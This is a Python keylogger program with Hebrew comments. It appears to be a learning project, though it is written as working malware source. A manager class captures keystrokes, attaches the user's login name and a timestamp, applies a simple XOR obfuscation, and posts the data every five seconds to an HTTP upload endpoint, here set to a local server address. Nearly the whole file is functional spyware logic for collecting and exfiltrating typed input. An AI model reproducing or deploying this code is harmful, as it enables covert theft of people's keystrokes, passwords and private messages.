from KeyLoggerService import KeyLoggerService
import Encryptor, NetworkWriter, time, os, json, ast, requests

#התוכנה שמצפינה
class Encryptor:
    def encryption_using_xor(self,data,key):
        encrypted_text = ''
        try:
            for i, word in enumerate(data):
                if word == '[' or word == ']':
                    continue
                else:    
                    encrypted_text += chr(ord(word) ^ key)
            # print (encrypted_text)    
            return encrypted_text
        except:
             return encrypted_text


from KeyLogger import IWriter
class  NetworkWriter(IWriter):
    def __init__(self):
        import requests
        super().__init__()
    def send_data(sel,data):
        try:    
            url = 'http://127.0.0.1:5000/api/upload'
            response = requests.post(url, json=data)
        except:
               return         

class KeyLoggerManager(KeyLoggerService):
    def __init__(self):
        super().__init__()
        self.data = []
        self.word = ''


    def list_to_word(self,list1:list):
     str1 = ''
     list_to_sand = []
     for i in list1:
          str1 += str(i)
     str1 = str1.replace("'",'')
     str1 = str1.split()
     try:
        list_to_sand = str1     
        return list_to_sand
     except:
          return ''     
             
    def start(self):
            from datetime import datetime
            machine = os.getlogin()
            self.start_logging()
            self.send1 = NetworkWriter()
            self.encryption = Encryptor()
            while True:
                #זמן ההמתנה בין כל שליחה
                time.sleep(5)
                list_to_send = self.list_to_word(self.text)
                #שמירת זמן עכשווי
                time1 = str(datetime.now())
                jeson = {'time':time1,'data':list_to_send,'machine':machine}
                if len(jeson['data']) == 0:
                            continue
                else:    
                    jeson = json.dumps(jeson,ensure_ascii=False)
                    #והצפנתו jsonשמירת המידע ב
                    jeson = json.dumps(self.encryption.encryption_using_xor(jeson,4))
                    #שליחה המידע לשרת
                    self.send1.send_data(jeson)
                    print(jeson)
                    self.text.clear()

C = KeyLoggerManager()
C.start()                    

